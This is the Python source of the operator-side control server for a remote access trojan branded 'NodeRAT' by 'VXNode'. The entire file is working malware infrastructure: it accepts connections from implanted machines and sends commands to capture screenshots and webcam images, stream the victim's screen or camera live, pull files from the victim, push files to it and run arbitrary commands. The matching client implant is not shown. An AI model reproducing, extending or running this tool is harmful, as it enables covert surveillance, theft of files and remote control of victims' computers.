import socket
import threading
import os
import cv2
import numpy as np
import struct
import time

SERVER_IP = "0.0.0.0"
SERVER_PORT = 5555
BUFFER_SIZE = 1024


ascii_banner = r"""
                                                                                            By VXNode

 /$$   /$$  /$$$$$$  /$$$$$$$  /$$$$$$$$ /$$$ /$$ /$$$$$$$   /$$$$$$  /$$$$$$$$
| $$$ | $$ /$$__  $$| $$__  $$| $$_____//$$ $$ $$| $$__  $$ /$$__  $$|__  $$__/
| $$$$| $$| $$  \ $$| $$  \ $$| $$     | $$  $$$/| $$  \ $$| $$  \ $$   | $$   
| $$ $$ $$| $$  | $$| $$  | $$| $$$$$  |__/\___/ | $$$$$$$/| $$$$$$$$   | $$   
| $$  $$$$| $$  | $$| $$  | $$| $$__/            | $$__  $$| $$__  $$   | $$   
| $$\  $$$| $$  | $$| $$  | $$| $$               | $$  \ $$| $$  | $$   | $$   
| $$ \  $$|  $$$$$$/| $$$$$$$/| $$$$$$$$         | $$  | $$| $$  | $$   | $$   
|__/  \__/ \______/ |_______/ |________/         |__/  |__/|__/  |__/   |__/   

Run "help" to list all commands

"""

print(ascii_banner) 

# Helper function to receive exactly n bytes
def recv_all(sock, length):
    data = b""
    while len(data) < length:
        more = sock.recv(length - len(data))
        if not more:
            raise EOFError("Socket closed before receiving all data")
        data += more
    return data

# Receive length-prefixed data from client
def receive_data(client_socket):
    length_bytes = recv_all(client_socket, 8)
    data_length = int.from_bytes(length_bytes, byteorder='big')
    data = recv_all(client_socket, data_length)
    return data

def receive_screenshot(client_socket):
    print("Receiving screenshot...")
    try:
        screenshot_data = receive_data(client_socket)
        with open("screenshot_received.png", "wb") as screenshot_file:
            screenshot_file.write(screenshot_data)
        print("Screenshot received and saved as screenshot_received.png")
    except Exception as e:
        print(f"[-] Error receiving screenshot: {e}")

def receive_webcam_image(client_socket):
    print("Receiving webcam image...")
    try:
        image_data = receive_data(client_socket)
        with open("webcam_received.png", "wb") as webcam_file:
            webcam_file.write(image_data)
        print("Webcam image received and saved as webcam_received.png")
    except Exception as e:
        print(f"[-] Error receiving webcam image: {e}")

def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')

def handle_client(client_socket):
    enter_timestamps = []

    try:
        while True:
            command = input("Enter command to send to client: ").strip()

            if command == "":
                now = time.time()
                enter_timestamps.append(now)

                # Keep only last 3 timestamps
                if len(enter_timestamps) > 3:
                    enter_timestamps.pop(0)

                # Check if 3 empties within 1 second
                if len(enter_timestamps) == 3 and (enter_timestamps[-1] - enter_timestamps[0]) < 1.0:
                    print("[*] Triple Enter detected! Resetting terminal...")
                    clear_console()
                    enter_timestamps = []
                    continue

                # If not triple enter, just continue waiting for next input
                continue
            else:
                # Reset timestamps if non-empty command entered
                enter_timestamps = []

            client_socket.send(command.encode())

            if command == "screenshot":
                receive_screenshot(client_socket)
                response = receive_data(client_socket).decode()
                print(response)

            elif command == "webcam":
                receive_webcam_image(client_socket)
                response = receive_data(client_socket).decode()
                print(response)

            elif command == "stream":
                print("[*] Starting live stream.")
                try:
                    while True:
                        # Tell client to send a frame
                        client_socket.sendall(b'S')

                        # Receive 4 bytes length prefix
                        length_bytes = recv_all(client_socket, 4)
                        frame_length = struct.unpack('>I', length_bytes)[0]

                        # Receive the actual frame bytes
                        frame_data = recv_all(client_socket, frame_length)

                        # Convert bytes to numpy array and decode image
                        frame_array = np.frombuffer(frame_data, dtype=np.uint8)
                        frame = cv2.imdecode(frame_array, cv2.IMREAD_COLOR)

                        if frame is None:
                            print("[-] Empty frame received, stopping stream.")
                            break

                        cv2.imshow("Live Stream", frame)

                        # Exit stream on ESC key press
                        if cv2.waitKey(1) & 0xFF == 27:
                            print("[*] ESC pressed, stopping stream.")
                            break

                except Exception as e:
                    print(f"[-] Stream error: {e}")

                cv2.destroyAllWindows()

            elif command == "stopstream":
                print("[*] Stopping stream.")
                # Client will break its stream loop on receiving this command

            elif command.startswith("download "):
                file_data = receive_data(client_socket)
                filename = command.split(" ", 1)[1]
                if file_data:
                    try:
                        with open(f"downloaded_{os.path.basename(filename)}", "wb") as f:
                            f.write(file_data)
                        print(f"[+] File saved as downloaded_{os.path.basename(filename)}")
                    except Exception as e:
                        print(f"[-] Failed to save file: {e}")
                else:
                    print("[-] No file received or file was empty.")

            elif command.startswith("upload "):
                filename = command.split(" ", 1)[1]
                try:
                    with open(filename, "rb") as f:
                        file_data = f.read()
                    # Send command first
                    client_socket.sendall(command.encode())
                    time.sleep(0.5)  # Give client a moment to prepare
                    client_socket.sendall(len(file_data).to_bytes(8, 'big'))
                    client_socket.sendall(file_data)
                    response = receive_data(client_socket).decode()
                    print(response)
                except Exception as e:
                    print(f"[-] Failed to send file: {e}")

            elif command == "exit":
                client_socket.close()
                break

            else:
                response = receive_data(client_socket).decode()
                print(response)

    except Exception as e:
        print(f"[-] Client disconnected: {e}")
        client_socket.close()

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((SERVER_IP, SERVER_PORT))
    server.listen(5)
    print(f"[*] Listening on {SERVER_IP}:{SERVER_PORT}")

    while True:
        client_socket, addr = server.accept()
        print(f"[*] Accepted connection from {addr[0]}:{addr[1]}")

        client_thread = threading.Thread(target=handle_client, args=(client_socket,))
        client_thread.start()

if __name__ == "__main__":
    main()
